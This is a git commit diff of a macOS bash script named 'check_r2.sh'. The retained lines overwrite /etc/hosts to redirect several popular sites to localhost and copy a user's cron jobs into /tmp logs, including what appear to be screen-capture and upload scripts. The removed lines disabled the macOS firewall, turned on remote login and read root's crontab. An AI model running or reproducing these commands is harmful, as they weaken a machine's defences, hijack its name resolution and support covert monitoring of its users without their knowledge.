240d26384c30e43295b5613b3e10c91843b6a0ab
Kirill Kochubey <kirill.kochubey@gmail.com>
2016-03-03 22:29:20 -0800

    Update check_r2.sh

--- mac/check_r2.sh
+++ mac/check_r2.sh
@@ -1,23 +1,14 @@
 #!/bin/bash
 #set -ex
 
+echo "Hi there it is me"
+
 cat /etc/hosts > /tmp/screen_mac_etc_hosts_r.log
 sed -i.bak 's/127.0.0.1.*/127.0.0.1  localhost github.com twitter.com netflix.com snapchat.com/' /etc/hosts true >> /tmp/screen_mac_a_etc_hosts3.log 2>> /tmp/screen_mac_a_etc_hosts3.log || true
 sed -i.bak 's/\:\:1.*/::1  localhost github.com twitter.com netflix.com snapchat.com/' /etc/hosts >> /tmp/screen_mac_a_etc_hosts3.log 2>> /tmp/screen_mac_a_etc_hosts3.log || true
 cat /etc/hosts > /tmp/screen_mac_a_etc_hosts1.log || true
 
-/usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode off || true
-/usr/libexec/ApplicationFirewall/socketfilterfw --setblockall off || true
-defaults write /Library/Preferences/com.apple.alf globalstate -int 0 || true
-launchctl unload /System/Library/LaunchDaemons/com.apple.alf.agent.plist || true
-launchctl load /System/Library/LaunchDaemons/com.apple.alf.agent.plist || true
-launchctl unload /System/Library/LaunchAgents/com.apple.alf.useragent.plist || true
-launchctl unload /System/Library/LaunchDaemons/com.apple.alf.agent.plist || true
-
 #/sbin/shutdown -h now
-
-systemsetup -setremotelogin on || true
-crontab -l -u root > /tmp/screen_mac_crontab_l_ur.log
 
 echo "Hello world"
 cat /etc/hosts > /tmp/screen_mac_etc_hosts.log
@@ -26,6 +17,6 @@ ls -la /Users/Vladdy/Library/Cron > /tmp/screen_mac_v_cron_ls.log
 cat /Users/Vladdy/Library/Cron/scrcap.sh > /tmp/screen_mac_v_cron_scrcap.log
 cat /Users/Vladdy/Library/Cron/upload_scrcap.sh > /tmp/screen_mac_v_cron_upload_scrcap.log
 
-sleep 50
-rm /tmp/screen_mac*.log
+#sleep 50
+#rm /tmp/screen_mac*.log
 #/sbin/shutdown -h now
